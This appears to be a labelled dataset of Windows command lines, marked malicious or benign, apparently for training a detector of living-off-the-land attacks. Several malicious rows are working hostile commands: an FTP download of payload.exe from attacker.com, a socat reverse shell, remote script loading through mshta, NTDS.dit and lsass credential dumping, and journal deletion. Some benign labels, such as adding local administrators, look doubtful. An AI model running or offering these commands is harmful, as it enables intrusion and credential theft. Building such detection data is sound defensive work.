command,label,source,command_id
xwizard RunWizard /taero /u {00000001-0000-0000-0000-0000FEEDACDC},1,combined_lotl,565
echo.exe RpoPiLAb0sjQ > D:\Temp\wybavqzv.ini,0,combined_lotl,566
msiexec /q /i {REMOTEURL},1,combined_lotl,567
"icacls ""C:\Users\AppData\ojzfetnx.exe"" /grant Everyone:F",0,combined_lotl,568
"powershell.exe -Command ""Get-ChildItem -Path C:\Program Files\Windows -Recurse | Select-Object FullName, Length""",0,combined_lotl,569
net.exe localgroup Administrators backup /add,0,combined_lotl,570
"type ""D:\Windows\dqsxt.exe""",0,combined_lotl,571
ping.exe 192.168.171.3,0,combined_lotl,572
"type ""C:\Windows\Windows\gsqgxflao.exe""",0,combined_lotl,573
"wbadmin start recovery -version:<VERSIONIDENTIFIER> -recoverytarget:{PATH_ABSOLUTE:folder} -itemtype:file -items:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -notRestoreAcl -quiet",1,combined_lotl,574
esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d {PATH_ABSOLUTE:.dit},1,combined_lotl,575
diskshadow> exec {PATH:.exe},1,combined_lotl,576
ping.exe 192.168.154.18,0,combined_lotl,577
assign letter=e,0,combined_lotl,578
Microsoft.Workflow.Compiler.exe {PATH} {PATH:.log},1,combined_lotl,579
ping 192.168.91.3,0,combined_lotl,580
"mkdir.exe ""C:\Temp\Windows""",0,combined_lotl,581
net localgroup Administrators qswwnwrv /add,0,combined_lotl,582
"copy ""D:\Temp\Windows\zwezrkog.exe"" ""C:\Program Files\kddpsztde.sys""",0,combined_lotl,583
odbcconf -f {PATH:.rsp},1,combined_lotl,584
"explorer.exe /root,""{PATH_ABSOLUTE:.exe}""",1,combined_lotl,585
"dir.exe ""D:\Logs\Program Files""",0,combined_lotl,586
"fsutil file layout ""D:\Logs\hlgpkg.exe""",0,combined_lotl,587
"copy ""C:\Users\Temp\gbabv.exe"" ""D:\Logs\Windows\efycamdcwd.exe""",0,combined_lotl,588
"wmic.exe /node:""192.168.0.1"" process call create ""{CMD}""",1,combined_lotl,589
Update.exe --updateRollback={PATH_SMB:folder},1,combined_lotl,590
msbuild.exe {PATH:.proj},1,combined_lotl,591
ping.exe 192.168.191.39,0,combined_lotl,592
"findstr.exe /C:""Ju6JSCWMM6uo"" ""D:\Program Files\vwxzwsgxpf.dat""",0,combined_lotl,593
"icacls.exe ""C:\Temp\stzeggwylp.dll"" /grant Everyone:F",0,combined_lotl,594
echo 4XrIn4StkO4O > D:\Logs\Program Files\yqbfns.exe,0,combined_lotl,595
stordiag.exe,1,combined_lotl,596
C:\Windows\System32\net.exe localgroup Administrators ffxskuxt /add,0,combined_lotl,597
runexehelper.exe {PATH_ABSOLUTE:.exe},1,combined_lotl,598
"echo %DATE% %TIME% >> ""C:\AppData\Logs\dhupvmeaq.dat""",0,combined_lotl,599
C:\Program Files (x86)\ping.exe 10.0.0.1,0,combined_lotl,600
"attrib.exe +h ""C:\Logs\xfalty.log""",0,combined_lotl,601
Scriptrunner.exe -appvscript {PATH:.exe},1,combined_lotl,602
TTTracer.exe -dumpFull -attach {PID},1,combined_lotl,603
fsutil volume [diskfree] D:\Users\uyrc\Documents,0,combined_lotl,604
"lbpolicy set lun type.exe=<type> [paths=C:\Windows\Program Files-{primary | <weight>}[,C:\Windows\Program Files-{primary | <weight>}[,…]]]",0,combined_lotl,605
diskshadow.exe /s {PATH:.txt},1,combined_lotl,606
"echo %DATE% %TIME% >> ""C:\Users\Program Files\autpcajrh.ini""",0,combined_lotl,607
msbuild.exe {PATH:.csproj},1,combined_lotl,608
echo.exe W5GPPuwzOhYe > C:\Windows\Program Files\boukcq.ini,0,combined_lotl,609
"bash.exe -c ""{CMD}""",1,combined_lotl,610
"icacls ""D:\Temp\Temp\vglvhhorb.log"" /grant Everyone:F",0,combined_lotl,611
"VSDiagnostics.exe start 2 /launch:{PATH:.exe} /launchArgs:""{CMD:args}""",1,combined_lotl,612
"copy ""C:\Logs\hyturetsmv.txt"" ""D:\Program Files\kxptv.exe""",0,combined_lotl,613
"wbadmin start backup -backupTarget:{PATH_ABSOLUTE:folder} -include:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -quiet",1,combined_lotl,614
"copy.exe ""C:\Temp\Windows\sufxbe.txt"" ""C:\Temp\potcox.dat""",0,combined_lotl,615
echo 6d5keXeUzVMc > D:\Windows\wrmptit.txt,0,combined_lotl,616
"rundll32.exe ieadvpack.dll,RegisterOCX {PATH:.dll}",1,combined_lotl,617
"move.exe ""C:\Program Files\mjqfgodti.ini"" ""C:\Temp\usfcwboor.dat""",0,combined_lotl,618
"echo.exe %DATE% %TIME% >> ""C:\Program Files\Program Files\hafyphnpyx.log""",0,combined_lotl,619
net user kzqqipvq /add,0,combined_lotl,620
remove [{letter=E | mount=C:\Users\dvxhox\Pictures [all]}] [noerr],0,combined_lotl,621
ping.exe 192.168.231.183,0,combined_lotl,622
diskshadow/set/unexpose {f36d0be6-0c4e-4075-b70d-e153f1fdaa2f | D | <share> | <mountpoint>},0,combined_lotl,623
"cmd.exe /c ""@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v""",1,combined_lotl,624
"echo %DATE% %TIME% >> ""C:\Windows\Windows\vwroiam.exe""",0,combined_lotl,625
fsutil.exe usn deletejournal /d c:,1,combined_lotl,626
net.exe localgroup Administrators xkxtpner /add,0,combined_lotl,627
control.exe {PATH_ABSOLUTE}:evil.dll,1,combined_lotl,628
Drive 2    Online      Healthy         107 GB    107 GB    0     2,0,combined_lotl,629
InfDefaultInstall.exe {PATH:.inf},1,combined_lotl,630
"echo.exe %DATE% %TIME% >> ""C:\Temp\Users\lokdorks.dll""",0,combined_lotl,631
echo Mul4c0ZFvtTV > C:\Users\Temp\frmpia.ini,0,combined_lotl,632
"echo %DATE% %TIME% >> ""D:\Temp\shnned.exe""",0,combined_lotl,633
"ysoserial.exe -o raw -f BinaryFormatter - g DataSet -c ""{CMD}"" > RecentViews & copy RecentViews %LOCALAPPDATA%\Microsoft\EventV~1\RecentViews & eventvwr.exe",1,combined_lotl,634
ping.exe 192.168.117.42,0,combined_lotl,635
"tasklist | findstr ""chrome.exe""",0,combined_lotl,636
ping.exe 10.0.0.1,0,combined_lotl,637
"move.exe ""D:\Program Files\AppData\ufiitfqjb.log"" ""C:\Users\sowze\Pictures\xkxsrk.ini""",0,combined_lotl,638
delete tpgroup [noerr],0,combined_lotl,639
"mkdir ""D:\Temp\Logs""",0,combined_lotl,640
"icacls ""C:\Temp\caiftwvmtw.sys"" /grant Everyone:F",0,combined_lotl,641
"copy ""C:\Windows\bxfcdtiw.exe"" ""C:\Temp\Windows\cfydx.txt""",0,combined_lotl,642
"echo %DATE% %TIME% >> ""C:\AppData\Temp\rjllsz.sys""",0,combined_lotl,643
ping.exe 192.168.68.221,0,combined_lotl,644
"dir.exe ""C:\Users\jynrpwfr\Documents""",0,combined_lotl,645
xbootmgrsleep.exe 1000 {PATH:.exe},1,combined_lotl,646
"forfiles /p c:\windows\system32 /m notepad.exe /c ""{CMD}""",1,combined_lotl,647
"findstr /C:""zvMehBymBG1V"" ""C:\Windows\spwqdzmxrk.sys""",0,combined_lotl,648
net.exe use Z: \\192.168.200.26\backup,0,combined_lotl,649
rasautou -d {PATH:.dll} -p export_name -a a -e e,1,combined_lotl,650
"move ""D:\Windows\Logs\tzqxligo.ini"" ""D:\Temp\Windows\ixstkwujl.log""",0,combined_lotl,651
"mshta.exe javascript:a=GetObject(""script:{REMOTEURL:.sct}"").Exec();close();",1,combined_lotl,652
"move ""C:\Temp\Windows\molhgxrx.exe"" ""C:\Windows\yfekejrkdj.dll""",0,combined_lotl,653
echo.exe UzIElejeED1l > D:\Users\lddjqk\Desktop\Desktop\cfudj.txt,0,combined_lotl,654
mmc.exe gpedit.msc,1,combined_lotl,655
"wmic process call create ""cmd.exe /c ntdsutil \""ac i ntds\"" ifm \""create full C:\Windows\Temp\Pro""",1,combined_lotl,656
"powershell.exe -Command ""Get-ChildItem -Path D:\Temp\AppData -Recurse | Select-Object FullName, Length""",0,combined_lotl,657
"dir.exe ""C:\Windows\Temp""",0,combined_lotl,658
"C:\Windows\powershell.exe -Command ""Get-ChildItem -Path C:\Users\lzcqeavr\Pictures -Recurse | Select-Object FullName, Length""",0,combined_lotl,659
"attrib +h ""C:\Program Files\Logs\elxucx.exe""",0,combined_lotl,660
msbuild.exe @{PATH:.rsp},1,combined_lotl,661
"wmic.exe process call create ""cmd.exe /c mkdir C:\Windows\Temp\tmp & ntdsutil.exe \""ac i ntds\"" ifm \""create full C:\Windows\Temp\tmp\",1,volttyphoon,662
net.exe localgroup Administrators jtqulgpo /add,0,combined_lotl,663
"rundll32 advpack.dll, RegisterOCX {cmd.exe}",1,combined_lotl,664
"del ""C:\Logs\didptik.txt"" /f /q",0,combined_lotl,665
echo.exe EobZudARJFHY > C:\AppData\Program Files\rflmml.sys,0,combined_lotl,666
jsc.exe {PATH:.js},1,combined_lotl,667
"C:\Windows\System32\echo.exe %DATE% %TIME% >> ""D:\AppData\ksfley.ini""",0,combined_lotl,668
"findstr.exe /C:""pWyU0uv5dbFo"" ""D:\Temp\Program Files\mhmjkqmpw.sys""",0,combined_lotl,669
"dir ""C:\Users\bdya\Downloads""",0,combined_lotl,670
"type.exe ""D:\Users\fdfheshx\Documents\jncdk.sys""",0,combined_lotl,671
net use Z: \\192.168.194.164\backup,0,combined_lotl,672
dump64.exe {PID} out.dmp,1,combined_lotl,673
"findstr.exe /C:""RdjAjHBwbjzc"" ""C:\Program Files\Users\xhcywvmks.txt""",0,combined_lotl,674
rem Set prompt to indicate current directory,0,combined_lotl,675
fsutil.exe usn [enumdata] <fileref> <lowUSN> <highUSN> <volumepath>,0,combined_lotl,676
"fsutil.exe file layout ""C:\AppData\bmclx.dat""",0,combined_lotl,677
"certutil.exe -hashfile ""D:\Temp\apotmmz.dll"" SHA256",0,combined_lotl,678
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\Windows\AppData\yegkjtpms.dll\"" \""C:\Users\slss\Documents\Documents\wpxtksgvz.exe\"""" /sc daily /st 23:00",0,combined_lotl,679
"copy ""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe"" C:\Users\Public\Downloads\MP.exe && chdir ""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\"" && ""C:\Users\Public\Downloads\MP.exe"" -DownloadFile -url {REMOTEURL:.exe} -path C:\Users\Public\Downloads\evil.exe",1,combined_lotl,680
"rmdir ""C:\Logs\Program Files"" /s /q",0,combined_lotl,681
C:\Windows\System32\net.exe localgroup Administrators dlklujwa /add,0,combined_lotl,682
"C:\Windows\System32\findstr.exe /C:""THxlmCSC7USx"" ""C:\Users\uylrojl.txt""",0,combined_lotl,683
net localgroup Administrators qlboxiaw /add,0,combined_lotl,684
"dir ""C:\Program Files\Windows""",0,combined_lotl,685
csc -target:library {PATH:.cs},1,combined_lotl,686
"move.exe ""C:\Logs\jdetb.sys"" ""D:\Users\pirihlxu\Pictures\Desktop\fumqgkqh.log""",0,combined_lotl,687
C:\Program Files\net.exe localgroup Administrators guest /add,0,combined_lotl,688
"findstr /C:""BifjEWcxCuj6"" ""C:\Users\cnkzibbbe.sys""",0,combined_lotl,689
"icacls.exe ""C:\Program Files\Temp\cwhqznx.dll"" /grant Everyone:F",0,combined_lotl,690
eudcedit,1,combined_lotl,691
ping.exe 192.168.189.178,0,combined_lotl,692
net localgroup Administrators gvfehtjb /add,0,combined_lotl,693
"mkdir.exe ""D:\Program Files\Program Files""",0,combined_lotl,694
"echo %DATE% %TIME% >> ""D:\Program Files\lukxo.ini""",0,combined_lotl,695
"powershell -Command ""Get-ChildItem -Path C:\Temp\Windows -Recurse | Select-Object FullName, Length""",0,combined_lotl,696
echo.exe s7Uw1VAWtaDI > D:\Users\swpipwy\Pictures\pffyr.sys,0,combined_lotl,697
"schtasks /create /tn ""My Daily Backup"" /tr ""C:\Windows\copy.exe \""C:\Users\ggmu\Downloads\chwhf.dat\"" \""C:\Temp\tgakdpsnbd.txt\"""" /sc daily /st 23:00",0,combined_lotl,698
"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""C:\Logs\Program Files\gmaerolsq.txt\"" \""D:\Windows\rqaumjpzt.log\"""" /sc daily /st 23:00",0,combined_lotl,699
"move.exe ""C:\Logs\vsvgrg.log"" ""C:\Program Files\aucsri.txt""",0,combined_lotl,700
"type.exe ""D:\Users\ewkhzpas.ini""",0,combined_lotl,701
"move ""C:\Logs\ejxrpam.ini"" ""D:\Users\fwmknivq\Pictures\Documents\lkgoufmwuz.sys""",0,combined_lotl,702
"dir.exe ""C:\Temp\AppData"" /s /b",0,combined_lotl,703
"copy ""D:\Users\vqltrx.dll"" ""D:\Windows\pzvcwxf.log""",0,combined_lotl,704
net use Z: \\192.168.32.197\public,0,combined_lotl,705
"fsutil file layout ""C:\Users\unjvs\Downloads\Downloads\hmzfaaro.exe""",0,combined_lotl,706
"fsutil file layout ""D:\AppData\tfvta.dll""",0,combined_lotl,707
"echo.exe %DATE% %TIME% >> ""D:\Users\AppData\qprmw.dat""",0,combined_lotl,708
powershell -ep RemoteSigned -f .\Launch-VsDevShell.ps1 -VsWherePath {PATH_ABSOLUTE:.exe},1,combined_lotl,709
te.exe {PATH:.wsc},1,combined_lotl,710
Ldifde -i -f {PATH:.ldf},1,combined_lotl,711
"icacls.exe ""C:\Logs\Users\qezrluwbox.dat"" /grant Everyone:F",0,combined_lotl,712
"rundll32.exe url.dll,FileProtocolHandler file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e",1,combined_lotl,713
tar -cf {PATH}:ads {PATH_ABSOLUTE:folder},1,combined_lotl,714
"dir ""C:\Windows\Temp"" /s /b",0,combined_lotl,715
add volume <volume> [provider 99a81c7d-1469-461f-a8bd-b08434291288],0,combined_lotl,716
msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xml},1,combined_lotl,717
"dir.exe ""C:\Windows\Users"" /s /b",0,combined_lotl,718
"type.exe ""D:\Temp\Program Files\ztfpgtize.sys""",0,combined_lotl,719
"move ""C:\Program Files\Logs\gzskharpnp.txt"" ""D:\Windows\bejbks.dat""",0,combined_lotl,720
"msedgewebview2.exe --disable-gpu-sandbox --gpu-launcher=""{CMD}""",1,combined_lotl,721
net use Z: \\192.168.234.206\backup,0,combined_lotl,722
net.exe user mcautzkv /add,0,combined_lotl,723
"
scanline.exe -t 192.168.1.0/24 -p 1-65535",1,combined_lotl,724
DataSvcUtil /out:{PATH_ABSOLUTE} /uri:{REMOTEURL},1,combined_lotl,725
"C:\Windows\copy.exe ""C:\Temp\Program Files\hybyqjbgb.dat"" ""C:\Windows\Program Files\fynblesd.ini""",0,combined_lotl,726
"echo %DATE% %TIME% >> ""C:\Temp\Windows\oabio.exe""",0,combined_lotl,727
ping.exe 192.168.108.229,0,combined_lotl,728
netsh.exe interface show interface,0,combined_lotl,729
"msedge.exe --headless --enable-logging --disable-gpu --dump-dom ""{REMOTEURL:.base64.html}"" > {PATH:.b64}",1,combined_lotl,730
"copy ""D:\Temp\qamzxbcbtm.exe"" ""C:\Program Files\rcygctjwz.dll""",0,combined_lotl,731
"certutil.exe -hashfile ""D:\Users\Temp\jwcoqy.ini"" SHA256",0,combined_lotl,732
ping.exe 192.168.229.195,0,combined_lotl,733
"attrib +h ""C:\Users\zgcw\Pictures\gatgpxriuv.ini""",0,combined_lotl,734
WinProj.exe {REMOTEURL},1,combined_lotl,735
"C:\Windows\System32\type.exe ""D:\Logs\evluwpo.dat""",0,combined_lotl,736
"C:\Windows\System32\attrib.exe +h ""C:\Users\nixdh.ini""",0,combined_lotl,737
"findstr /C:""fkXyz62uAjGV"" ""D:\Windows\hcgduxu.txt""",0,combined_lotl,738
"echo %DATE% %TIME% >> ""D:\AppData\qdwze.exe""",0,combined_lotl,739
"rmdir.exe ""D:\Program Files\Program Files"" /s /q",0,combined_lotl,740
"E:\Windows\echo.exe %DATE% %TIME% >> ""C:\Users\zxstx\Downloads\Documents\wcuwprkwuj.dat""",0,combined_lotl,741
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\Temp\riigoizp.exe\"" \""C:\Users\uquha.dat\"""" /sc daily /st 23:00",0,combined_lotl,742
"icacls ""D:\Logs\Program Files\xzgusgchor.ini"" /grant Everyone:F",0,combined_lotl,743
"del ""C:\Users\nnayscuv\Documents\wuqvvr.dll"" /f /q",0,combined_lotl,744
"fsutil file layout ""C:\AppData\cuzyqixanz.exe""",0,combined_lotl,745
cmd.exe /c netsh.exe interface portproxy add v4tov4 listenport=50100 listenaddress=0.0.0.0 connectport=1433 connectaddress=,1,volttyphoon,746
"icacls.exe ""D:\Users\Program Files\drsanpdd.dll"" /grant Everyone:F",0,combined_lotl,747
ping.exe 192.168.105.49,0,combined_lotl,748
"eventcreate.exe /s server /u user /id 100 /t WARNING /d ""Remote machine with partial user credentials""",0,volttyphoon,749
"bash.exe -c ""socat tcp-connect:192.168.1.9:66 exec:sh,pty,stderr,setsid,sigint,sane""",1,combined_lotl,750
"rundll32.exe advpack.dll,LaunchINFSection {PATH:.inf},,1,",1,combined_lotl,751
C:\Program Files (x86)\ping.exe 8.8.8.8,0,combined_lotl,752
"C:\Windows\NTDS\ntds.dit' to
'\\?\GLOBALROOT\Device\{redacted}VolumeShadowC
opy1\Windows\NTDS\ntds.dit'",1,combined_lotl,753
"rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 {PATH_ABSOLUTE:.inf}",1,combined_lotl,754
C:\Windows\System32\net.exe user kjaanjch /add,0,combined_lotl,755
"findstr.exe /C:""Ygge2BaxroQo"" ""D:\Logs\yqmhsdvcd.dat""",0,combined_lotl,756
"fsutil file layout ""C:\Users\gjml\Documents\Downloads\oqphhd.exe""",0,combined_lotl,757
C:\Windows\System32\net.exe user cssdgpfh /add,0,combined_lotl,758
"copy.exe ""C:\Users\hifhq\Pictures\Desktop\fghxtcbvvp.txt"" ""C:\Users\nrht\Documents\Pictures\ubvjzequ.txt""",0,combined_lotl,759
evntcmd [/s <computername>] [/v <verbositylevel>] [/n] C:\Temp\Temp\ziealwacog.dat,0,combined_lotl,760
"icacls ""D:\AppData\vhjtgxsc.exe"" /grant Everyone:F",0,combined_lotl,761
"attrib.exe +h ""D:\Users\llkuu\Pictures\Desktop\qmxgbnqran.txt""",0,combined_lotl,762
WFMFormat.exe,1,combined_lotl,763
ping 192.168.143.145,0,combined_lotl,764
echo BTJmZAGEQbeK > D:\Windows\kmripzuu.exe,0,combined_lotl,765
net.exe user suabwgdy /add,0,combined_lotl,766
mshta.exe {REMOTEURL},1,combined_lotl,767
"echo.exe %DATE% %TIME% >> ""C:\Temp\ulwya.txt""",0,combined_lotl,768
"move ""C:\Windows\mtiqtqm.dll"" ""C:\Program Files\Temp\cmzlu.ini""",0,combined_lotl,769
"set windir=c:\test& cd ""C:\Program Files\Internet Explorer\"" & iediagcmd.exe /out:{PATH_ABSOLUTE:.cab}",1,combined_lotl,770
net.exe user btauvbrq /add,0,combined_lotl,771
"rundll32.exe advpack.dll,RegisterOCX {PATH:.dll}",1,combined_lotl,772
"fsutil.exe file layout ""C:\Windows\sjpgj.sys""",0,combined_lotl,773
"fsutil file layout ""C:\Users\fnoldpc\Downloads\ninbq.log""",0,combined_lotl,774
"copy ""C:\Program Files\kngitbtt.sys"" ""C:\Temp\Logs\pjljvt.txt""",0,combined_lotl,775
"del ""C:\Temp\Users\kjnpxrocw.txt"" /f /q",0,combined_lotl,776
chap initiator remember secret=[YO7b1sdr059iAGuE] target=iqn.2025-11.com.example:pgtdyvdt,0,combined_lotl,777
"C:\Windows\System32\icacls.exe ""D:\Users\tkrtzk\Documents\Documents\ptpjaws.dat"" /grant Everyone:F",0,combined_lotl,778
"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""C:\Program Files\rsqpiivy.dll\"" \""C:\Users\Program Files\lzcktjk.dll\"""" /sc daily /st 23:00",0,combined_lotl,779
"odbcconf INSTALLDRIVER ""lolbas-project|Driver={PATH_ABSOLUTE:.dll}|APILevel=2""
odbcconf configsysdsn ""lolbas-project"" ""DSN=lolbas-project""
",1,combined_lotl,780
echo.exe J23frTEDmDVx > D:\Temp\Users\phzxux.log,0,combined_lotl,781
te.exe {PATH:.dll},1,combined_lotl,782
"HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\PortProxy\v4tov4
\cp\0.0.0.0/49275 | {redacted IP address}/8443.",1,combined_lotl,783
"C:\Windows\System32\dir.exe ""C:\Users\Logs""",0,combined_lotl,784
"echo.exe %DATE% %TIME% >> ""C:\Program Files\fkaowzrp.txt""",0,combined_lotl,785
dnx.exe {PATH_ABSOLUTE:folder},1,combined_lotl,786
"del ""C:\Temp\Logs\bzyqgs.ini"" /f /q",0,combined_lotl,787
"dir.exe ""D:\Temp\AppData"" /s /b",0,combined_lotl,788
vbc -reference:Microsoft.VisualBasic.dll {PATH_ABSOLUTE:.vb},1,combined_lotl,789
Controller port associations changed.,0,combined_lotl,790
regasm.exe {PATH:.dll},1,combined_lotl,791
ping.exe 192.168.158.4,0,combined_lotl,792
"C:\Windows\powershell.exe -Command ""Get-ChildItem -Path C:\Temp\Program Files -Recurse | Select-Object FullName, Length""",0,combined_lotl,793
"move.exe ""C:\Users\Users\scfyzqjn.sys"" ""D:\Logs\Program Files\wwnigyxt.ini""",0,combined_lotl,794
CustomShellHost.exe,1,combined_lotl,795
fsutil.exe usn [readjournal] [c= <chunk-size> s=<file-size-threshold>] D:\Program Files\Windows,0,combined_lotl,796
"create lun stripe [size=825] [drives=<n, n> [,...]]  [stripesize=825] [noerr]",0,combined_lotl,797
runscripthelper.exe surfacecheck \\?\{PATH_ABSOLUTE:.txt} {PATH_ABSOLUTE:folder},1,combined_lotl,798
"C:\Windows\System32\at.exe 09:00 /interactive /every:m,t,w,th,f,s,su {CMD}",1,combined_lotl,799
"move.exe ""D:\Logs\tkqlzuwrgg.sys"" ""D:\Logs\htlcyprnu.dll""",0,combined_lotl,800
rdrleakdiag.exe /p 940 /o {PATH_ABSOLUTE:folder} /fullmemdmp /wait 1,1,combined_lotl,801
ping.exe 192.168.40.28,0,combined_lotl,802
"certutil.exe -hashfile ""C:\Users\xzqbq.dat"" SHA256",0,combined_lotl,803
"del ""C:\Temp\pqgjk.txt"" /f /q",0,combined_lotl,804
"cmd.exe /Q /c wmic process call create ""cmd.exe /c mkdir C:\Windows\Temp\tmp & ntdsutil \""ac i ntds\"" ifm \""create full C:\Windows\Temp\tmp\"" 1> \\127.0.0.1\ADMIN$\ 2>&1",1,combined_lotl,805
"certutil.exe -hashfile ""D:\AppData\Program Files\jpgxiem.log"" SHA256",0,combined_lotl,806
"findstr /C:""INansRMlfofF"" ""D:\Users\euwgpq\Documents\bviunlkm.sys""",0,combined_lotl,807
"attrib +h ""D:\Program Files\zxrflukh.ini""",0,combined_lotl,808
LUN 5 is now the selected LUN.,0,combined_lotl,809
"msedge.exe --disable-gpu-sandbox --gpu-launcher=""{CMD} &&""",1,combined_lotl,810
"dsdbutil.exe ""activate instance ntds"" ""snapshot"" ""delete {GUID}"" ""quit"" ""quit""",1,combined_lotl,811
sqldumper.exe 464 0 0x0110,1,combined_lotl,812
net.exe user jebyenda /add,0,combined_lotl,813
expand {PATH_SMB:.bat} {PATH_ABSOLUTE:.bat},1,combined_lotl,814
"C:\Windows\System32\powershell.exe -Command ""Get-ChildItem -Path D:\Users\hwvcww\Downloads -Recurse | Select-Object FullName, Length""",0,combined_lotl,815
"wmic.exe process call create ""{PATH_ABSOLUTE}:program.exe""",1,combined_lotl,816
C:\Windows\System32\echo.exe yatUxuVsN1iu > D:\Windows\Temp\mgwhf.dll,0,combined_lotl,817
"type ""C:\AppData\vrudt.ini""",0,combined_lotl,818
ping.exe 192.168.41.19,0,combined_lotl,819
certoc.exe -GetCACAPS {REMOTEURL:.ps1},1,combined_lotl,820
"rmdir.exe ""D:\Users\plxoj\Documents"" /s /q",0,combined_lotl,821
"""cmd.exe /c ""netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress= connectport=8443 protocol=tcp""""",1,combined_lotl,822
winget.exe install --accept-package-agreements -s msstore {name or ID},1,combined_lotl,823
"certutil -hashfile ""C:\Logs\AppData\bdoeat.exe"" SHA256",0,combined_lotl,824
"attrib.exe +h ""C:\Windows\Users\znzasrp.log""",0,combined_lotl,825
"AgentExecutor.exe -powershell ""{PATH_ABSOLUTE:.ps1}"" ""{PATH_ABSOLUTE:.1.log}"" ""{PATH_ABSOLUTE:.2.log}"" ""{PATH_ABSOLUTE:.3.log}"" 60000 ""C:\Windows\SysWOW64\WindowsPowerShell\v1.0"" 0 1",1,combined_lotl,826
"copy ""D:\Users\Windows\degucxmmt.exe"" ""C:\Windows\envcknrhle.dll""",0,combined_lotl,827
"rundll32.exe C:\Windows\System32\scrobj.dll,GenerateTypeLib {REMOTEURL:.exe}",1,combined_lotl,828
net.exe localgroup Administrators ansitjip /add,0,combined_lotl,829
Update.exe --update={PATH_SMB:folder},1,combined_lotl,830
C:\Windows\Microsoft.NET\Framework\v4.0.30319\AddinUtil.exe -AddinRoot:.,1,combined_lotl,831
"move.exe ""C:\Temp\AppData\ilfszf.log"" ""C:\Users\hwddcbev\Downloads\dyecszfqo.log""",0,combined_lotl,832
ping.exe 192.168.23.170,0,combined_lotl,833
"certutil -hashfile ""D:\Windows\Logs\xevsvulfq.exe"" SHA256",0,combined_lotl,834
"E:\Windows\findstr.exe /C:""VL1RkxIQGtAB"" ""C:\AppData\htwjbbtl.ini""",0,combined_lotl,835
"winrm invoke Create wmicimv2/Win32_Process @{CommandLine=""{C:\Windows\cmd.exe}""} -r:http://target:5985",1,combined_lotl,836
"dsdbutil.exe ""activate instance ntds"" ""snapshot"" ""mount {GUID}"" ""quit"" ""quit""",1,combined_lotl,837
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\Logs\Temp\tshzw.exe\"" \""C:\Program Files\Program Files\yzsdonen.txt\"""" /sc daily /st 23:00",0,combined_lotl,838
adplus.exe -hang -pn lsass.exe -o {PATH_ABSOLUTE:folder} -quiet,1,combined_lotl,839
"fsutil.exe file layout ""D:\Users\ejhi\Pictures\Pictures\fbsbrvktde.dll""",0,combined_lotl,840
"findstr.exe /C:""678jLbytikDb"" ""C:\Temp\sczjfu.sys""",0,combined_lotl,841
C:\Program Files\ping.exe 192.168.1.1,0,combined_lotl,842
mpiexec.exe {CMD},1,combined_lotl,843
"copy.exe ""C:\Users\zmcgled.dat"" ""C:\Program Files\rxvkdtepsh.dll""",0,combined_lotl,844
"fsutil file layout ""C:\Windows\Logs\mnjjegzzt.exe""",0,combined_lotl,845
"icacls.exe ""C:\Temp\dfswjk.ini"" /grant Everyone:F",0,combined_lotl,846
net use Z: \\192.168.76.182\public,0,combined_lotl,847
OneDriveStandaloneUpdater,1,combined_lotl,848
ping 192.168.109.185,0,combined_lotl,849
"dir.exe ""C:\Users\txymbzci\Downloads\Documents""",0,combined_lotl,850
"C:\Windows\System32\echo.exe %DATE% %TIME% >> ""D:\AppData\Logs\eepur.txt""",0,combined_lotl,851
"echo %DATE% %TIME% >> ""D:\Logs\Program Files\atecky.exe""",0,combined_lotl,852
"copy ""C:\Logs\osqektsak.exe"" ""C:\AppData\syvovvfdk.dll""",0,combined_lotl,853
